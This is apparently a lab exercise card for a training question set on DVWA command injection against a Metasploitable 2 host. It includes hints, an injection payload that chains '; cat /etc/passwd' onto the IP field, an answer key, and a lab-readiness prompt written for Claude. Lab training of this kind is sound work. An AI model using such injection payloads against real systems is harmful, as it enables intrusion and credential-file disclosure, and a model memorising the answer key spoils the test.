# Q071 — DVWA Command Injection

| Field | Value |
|---|---|
| **Target** | `192.168.52.129` (Metasploitable 2) |
| **Domain** | 12 — Web Apps / 13 — SQLi |
| **Difficulty** | 🟡 Medium |
| **Tools** | `browser (or curl)` |
| **Time budget** | 15–25 min |

---

## 📝 Question

On DVWA command injection (low), inject to read `/etc/passwd`. Provide the payload appended to the IP field.

---

## 🎯 Flag Format

```
payload=<text>
```

Example: `payload=; cat /etc/passwd`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

Use `;`, `&&`, or `|` to chain.
</details>

<details>
<summary>Hint 2</summary>

Low security uses no sanitization.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
# In IP field: 127.0.0.1; cat /etc/passwd
```

Returns full passwd contents.

**Answer:** `payload=; cat /etc/passwd`

📖 Ref: [playbooks/webapp-playbook.md](../../playbooks/webapp-playbook.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q071:
1. DVWA up on 192.168.52.129; security=low; logged in.
2. Command injection page is /dvwa/vulnerabilities/exec/ — reachable.
3. No host-side config needed.

Report back: "Lab ready for Q071 — DVWA exec page reachable, security=low".
```
